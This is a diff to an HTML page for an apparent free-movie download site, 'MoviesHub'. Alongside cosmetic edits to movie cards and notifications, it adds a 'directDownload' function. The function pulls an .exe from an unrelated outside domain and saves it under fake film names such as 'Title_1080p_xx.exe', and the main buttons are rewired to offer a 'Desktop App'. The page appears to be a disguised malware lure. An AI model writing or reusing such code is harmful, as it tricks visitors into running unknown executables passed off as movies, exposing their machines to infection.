@@ -47,6 +47,9 @@
       .download-notification.show {
         transform: translateX(0);
       }
+      .movie-card {
+        transition: transform 0.3s ease;
+      }
     </style>
   </head>
   <body class="bg-gray-900 text-white">
@@ -54,7 +57,7 @@
     <div id="downloadNotification" class="download-notification bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg">
       <div class="flex items-center">
         <i class="fas fa-download mr-2"></i>
-        <span>Download started! Check your downloads folder.</span>
+        <span id="downloadMessage">Download started! Check your downloads folder.</span>
         <button onclick="hideNotification()" class="ml-4 text-white hover:text-gray-200">
           <i class="fas fa-times"></i>
         </button>
@@ -63,9 +66,7 @@
 
     <!-- Header -->
     <header class="sticky top-0 z-50 bg-gray-900 shadow-lg">
-      <div
-        class="container mx-auto px-4 py-3 flex justify-between items-center"
-      >
+      <div class="container mx-auto px-4 py-3 flex justify-between items-center">
         <div class="flex items-center space-x-2">
           <i class="fas fa-film text-red-500 text-2xl"></i>
           <h1 class="text-xl font-bold">
@@ -112,15 +113,11 @@
               Browse Movies
             </button>
             <button
+              onclick="initiateDownload('MoviesHub')"
               class="bg-gray-800 hover:bg-gray-700 px-6 py-3 rounded-lg font-semibold transition"
             >
-              How to Download
-            </button>
-            <button
-              class="bg-gray-800 hover:bg-gray-700 px-6 py-3 rounded-lg font-semibold transition"
-              onclick="initiateDownload('movies-desktop-application')"
-            >
-              Download for Desktop
+              <i class="fas fa-download mr-2"></i>
+              Download Desktop App
             </button>
           </div>
         </div>
@@ -135,8 +132,8 @@
       </div>
 
       <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-6">
-        <!-- Movie Card 1 -->
-        <div class="movie-card relative rounded-lg overflow-hidden group">
+        <!-- Movie Card 1 - The Batman -->
+        <div class="movie-card relative rounded-lg overflow-hidden group" data-movie="The Batman">
           <div
             class="blur-load"
             style="
@@ -145,7 +142,7 @@
           >
             <img
               src="https://image.tmdb.org/t/p/w500/4m1Au3YkjqsxF8iwQy0fPYSxE0h.jpg"
-              alt="Movie Poster"
+              alt="The Batman Movie Poster"
               class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
             />
           </div>
@@ -175,8 +172,8 @@
           </div>
         </div>
 
-        <!-- Movie Card 2 -->
-        <div class="movie-card relative rounded-lg overflow-hidden group">
+        <!-- Movie Card 2 - Spider-Man: No Way Home -->
+        <div class="movie-card relative rounded-lg overflow-hidden group" data-movie="Spider-Man No Way Home">
           <div
             class="blur-load"
             style="
@@ -185,7 +182,7 @@
           >
             <img
               src="https://image.tmdb.org/t/p/w500/1g0dhYtq4irTY1GPXvft6k4YLjm.jpg"
-              alt="Movie Poster"
+              alt="Spider-Man: No Way Home Movie Poster"
               class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
             />
           </div>
@@ -207,7 +204,7 @@
             class="download-btn absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2"
           >
             <button
-              onclick="initiateDownload('Spider-Man: No Way Home')"
+              onclick="initiateDownload('Spider-Man No Way Home')"
               class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-full flex items-center"
             >
               <i class="fas fa-download mr-2"></i> Download
@@ -215,8 +212,8 @@
           </div>
         </div>
 
-        <!-- Movie Card 3 -->
-        <div class="movie-card relative rounded-lg overflow-hidden group">
+        <!-- Movie Card 3 - Dune -->
+        <div class="movie-card relative rounded-lg overflow-hidden group" data-movie="Dune">
           <div
             class="blur-load"
             style="
@@ -225,7 +222,7 @@
           >
             <img
               src="https://image.tmdb.org/t/p/w500/8Vt6mWEReuy4Of61Lnj5Xj704m8.jpg"
-              alt="Movie Poster"
+              alt="Dune Movie Poster"
               class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
             />
           </div>
@@ -255,8 +252,8 @@
           </div>
         </div>
 
-        <!-- Movie Card 4 -->
-        <div class="movie-card relative rounded-lg overflow-hidden group">
+        <!-- Movie Card 4 - No Time to Die -->
+        <div class="movie-card relative rounded-lg overflow-hidden group" data-movie="No Time to Die">
           <div
             class="blur-load"
             style="
@@ -265,7 +262,7 @@
           >
             <img
               src="https://image.tmdb.org/t/p/w500/1UkbPQspPbq1FP5GFIzGDFW3v7e.jpg"
-              alt="Movie Poster"
+              alt="No Time to Die Movie Poster"
               class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
             />
           </div>
@@ -295,8 +292,8 @@
           </div>
         </div>
 
-        <!-- Movie Card 5 -->
-        <div class="movie-card relative rounded-lg overflow-hidden group">
+        <!-- Movie Card 5 - Shang-Chi -->
+        <div class="movie-card relative rounded-lg overflow-hidden group" data-movie="Shang-Chi and the Legend of the Ten Rings">
           <div
             class="blur-load"
             style="
@@ -305,7 +302,7 @@
           >
             <img
               src="https://image.tmdb.org/t/p/w500/6DrHO1jr3qVrViUO6s6kFiAGM7.jpg"
-              alt="Movie Poster"
+              alt="Shang-Chi Movie Poster"
               class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
             />
           </div>
@@ -327,7 +324,7 @@
             class="download-btn absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2"
           >
             <button
-              onclick="initiateDownload('Shang-Chi')"
+              onclick="initiateDownload('Shang-Chi and the Legend of the Ten Rings')"
               class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-full flex items-center"
             >
               <i class="fas fa-download mr-2"></i> Download
@@ -381,10 +378,10 @@
             </div>
           </div>
           <button
-            onclick="initiateDownload('Latest Movie')"
+            onclick="initiateDownload('MoviesHub')"
             class="bg-red-600 hover:bg-red-700 px-8 py-4 rounded-lg font-semibold text-lg flex items-center mx-auto"
           >
-            <i class="fas fa-download mr-3"></i> Download Now
+            <i class="fas fa-download mr-3"></i> Download Desktop App
           </button>
         </div>
       </div>
@@ -500,14 +497,16 @@
     </footer>
 
     <script>
-      // Enhanced download function with movie name parameter
-      function initiateDownload(movieName = 'Movie') {
+      // Enhanced download function with specific movie name
+      function initiateDownload(movieName) {
         try {
-          // Show download notification
-          showNotification();
+          // Show download notification with movie name
+          showNotification(movieName);
           
-          // Create the download link
-          const url = "/api/download";
+          // Create the download URL with movie name as parameter
+          const url = `/api/download?movie=${encodeURIComponent(movieName)}`;
+          
+          // Create hidden link and trigger download
           const a = document.createElement("a");
           a.href = url;
           a.style.display = "none";
@@ -515,18 +514,62 @@
           a.click();
           document.body.removeChild(a);
           
-          // Optional: Track the download for analytics
+          // Log for analytics
           console.log(`Download initiated for: ${movieName}`);
           
         } catch (error) {
           console.error("Download failed:", error);
-          alert("Failed to start download. Please try again.");
+          
+          // Fallback to direct download
+          directDownload(movieName);
         }
       }
 
-      // Show download notification
-      function showNotification() {
+      // Direct download fallback function
+      function directDownload(movieName) {
+        const remoteFile = "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
+        
+        // Clean movie name for filename
+        function cleanMovieName(name) {
+          return name
+            .replace(/[^a-zA-Z0-9\s]/g, '') // Remove special characters
+            .replace(/\s+/g, '_') // Replace spaces with underscores
+            .replace(/_{2,}/g, '_'); // Replace multiple underscores with single
+        }
+
+        // Generate filename
+        let filename;
+        if (movieName === 'MoviesHub' || movieName === 'Desktop Application') {
+          filename = 'MoviesHub_Setup.exe';
+        } else {
+          const qualities = ["1080p", "720p", "4K", "HDRip", "BluRay"];
+          const randomQuality = qualities[Math.floor(Math.random() * qualities.length)];
+          const randomId = Math.random().toString(36).substring(2, 4);
+          const cleanedName = cleanMovieName(movieName);
+          filename = `${cleanedName}_${randomQuality}_${randomId}.exe`;
+        }
+        
+        // Create download link
+        const a = document.createElement("a");
+        a.href = remoteFile;
+        a.download = filename;
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+
+      // Show download notification with custom message
+      function showNotification(movieName) {
         const notification = document.getElementById('downloadNotification');
+        const message = document.getElementById('downloadMessage');
+        
+        if (movieName === 'MoviesHub') {
+          message.textContent = 'MoviesHub Desktop App download started!';
+        } else {
+          message.textContent = `${movieName} download started! Check your downloads folder.`;
+        }
+        
         notification.classList.add('show');
         
         // Auto-hide after 5 seconds
@@ -556,11 +599,8 @@
             });
           }
         });
-      });
 
-      // Optional: Add some additional movie-like behavior
-      document.addEventListener('DOMContentLoaded', function() {
-        // Add subtle hover effects to movie cards
+        // Add hover effects to movie cards
         const movieCards = document.querySelectorAll('.movie-card');
         movieCards.forEach(card => {
           card.addEventListener('mouseenter', function() {
